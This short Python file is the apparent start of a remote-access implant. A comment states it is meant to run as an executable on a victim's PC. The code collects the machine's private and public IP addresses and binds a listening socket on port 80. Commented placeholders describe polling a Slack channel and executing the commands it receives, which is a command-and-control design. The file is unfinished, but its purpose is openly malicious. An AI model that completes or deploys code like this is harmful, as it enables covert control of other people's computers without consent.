import socket 
from requests import *
import irc

#This file would be run on a VICTIM pc as an exe

#grabbing private and public ip to show 
private_ip = socket.gethostbyname(socket.gethostname())
public_ip = get('https://api.ipify.org').text


#create socket object for getting commands from Slack
s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
s.bind(('', 80))



#while connection exists
#	check slack channel and execute commands as it comes
